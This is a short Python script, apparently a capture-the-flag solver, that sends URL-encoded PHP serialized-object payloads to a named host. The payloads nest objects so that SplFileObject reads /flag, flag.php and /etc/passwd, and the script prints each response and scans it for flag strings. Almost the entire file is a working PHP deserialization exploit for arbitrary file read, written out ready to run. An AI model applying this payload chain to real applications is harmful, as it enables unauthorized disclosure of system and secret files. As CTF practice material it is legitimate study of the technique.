import requests

# 测试URL列表
test_cases = [
    ("/flag", "http://f7c8a2a3.clsadp.com/?data=O%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A5%3A%22Until%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22%2Fflag%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22r%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass2%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass1%22%3B%7D"),
    ("flag", "http://f7c8a2a3.clsadp.com/?data=O%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A5%3A%22Until%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A1%3A%22b%22%3Bs%3A4%3A%22flag%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22r%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass2%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass1%22%3B%7D"),
    ("flag.php", "http://f7c8a2a3.clsadp.com/?data=O%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A5%3A%22Until%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A1%3A%22b%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22r%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass2%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass1%22%3B%7D"),
    ("/etc/passwd", "http://f7c8a2a3.clsadp.com/?data=O%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A7%3A%22install%22%3A2%3A%7Bs%3A17%3A%22%00install%00username%22%3BO%3A5%3A%22Until%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A1%3A%22b%22%3Bs%3A11%3A%22%2Fetc%2Fpasswd%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22r%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass2%22%3B%7Ds%3A17%3A%22%00install%00password%22%3Bs%3A5%3A%22pass1%22%3B%7D"),
]

for path, url in test_cases:
    print(f"\n{'='*60}")
    print(f"Testing path: {path}")
    print(f"{'='*60}")
    
    try:
        response = requests.get(url, timeout=15)
        print(f"Status Code: {response.status_code}")
        print(f"\nResponse Content:")
        print(response.text)
        
        # 检查是否包含flag
        if "flag{" in response.text.lower() or "ctf{" in response.text.lower():
            print("\n" + "!"*60)
            print("!!! POTENTIAL FLAG FOUND !!!")
            print("!"*60)
            
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
    except Exception as e:
        print(f"Error: {e}")

print("\n" + "="*60)
print("Testing complete!")
print("="*60)
